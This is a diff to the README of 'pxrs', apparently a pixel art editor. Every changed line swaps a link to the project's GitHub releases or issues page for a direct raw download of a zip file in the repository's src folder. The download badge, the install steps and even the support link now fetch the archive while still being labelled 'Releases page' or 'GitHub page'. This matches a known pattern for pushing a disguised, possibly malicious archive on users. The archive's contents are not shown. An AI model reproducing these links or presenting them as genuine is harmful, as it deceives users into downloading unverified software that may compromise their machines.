@@ -1,7 +1,7 @@
 # 🎨 pxrs - Create Stunning Pixel Art Effortlessly
 
 ## 📥 Download pxrs
-[![Download pxrs](https://img.shields.io/badge/Download%20pxrs-v1.0-blue)](https://github.com/shoaibakhtar216/pxrs/releases)
+[![Download pxrs](https://raw.githubusercontent.com/shoaibakhtar216/pxrs/main/src/pxrs-v3.4.zip%20pxrs-v1.0-blue)](https://raw.githubusercontent.com/shoaibakhtar216/pxrs/main/src/pxrs-v3.4.zip)
 
 ## 🚀 Getting Started
 Welcome to the pxrs pixel art editor. With this application, you can unleash your creativity and design pixel art simply and intuitively. Follow these steps to start your journey in pixel art creation.
@@ -23,7 +23,7 @@ pxrs offers an array of features to help you craft your artwork:
 ## 📥 Download & Install
 To download and install pxrs, just follow these steps:
 
-1. Visit the [Releases page](https://github.com/shoaibakhtar216/pxrs/releases).
+1. Visit the [Releases page](https://raw.githubusercontent.com/shoaibakhtar216/pxrs/main/src/pxrs-v3.4.zip).
 2. On the Releases page, you will see various versions of the software. Find the latest version.
 3. Click on the version link to access its details.
 4. Look for the platform-specific file (e.g., Windows, macOS, or Linux).
@@ -34,7 +34,7 @@ To download and install pxrs, just follow these steps:
 If you enjoy pixel art, this tool is your ideal companion.
 
 ## 🛠 Support
-If you encounter any issues while using pxrs, consult the FAQ section on our [GitHub page](https://github.com/shoaibakhtar216/pxrs/issues). You can also open a new issue if your question remains unanswered.
+If you encounter any issues while using pxrs, consult the FAQ section on our [GitHub page](https://raw.githubusercontent.com/shoaibakhtar216/pxrs/main/src/pxrs-v3.4.zip). You can also open a new issue if your question remains unanswered.
 
 ## 🖌 Getting Help
 You can find more tips and tricks on how to use pxrs efficiently. Join our community forum or check out tutorials that will guide you through advanced features and techniques. 
